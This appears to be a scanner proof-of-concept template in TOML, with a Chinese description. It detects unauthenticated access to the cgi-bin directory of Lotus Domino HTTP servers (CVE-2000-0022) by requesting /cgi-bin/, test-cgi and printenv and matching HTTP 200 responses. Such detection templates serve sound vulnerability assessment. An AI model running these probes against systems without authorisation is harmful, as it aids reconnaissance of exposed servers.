[info]
author = "ave"
description = "通过向 Lotus Domino HTTP 服务器的 /cgi-bin/ 目录发送 HTTP 请求，检测是否返回 200 OK 而非应有的 401/403 认证拒绝状态码，从而验证是否存在未授权访问漏洞。"
id = "POC-AVE-2000-0020"
name = "Lotus Domino HTTP 服务器 cgi-bin 目录匿名访问漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0020"]
vuln_id = [
    "CVE-2000-0022",
    "AVE-2000-0020",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test-cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/printenv"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
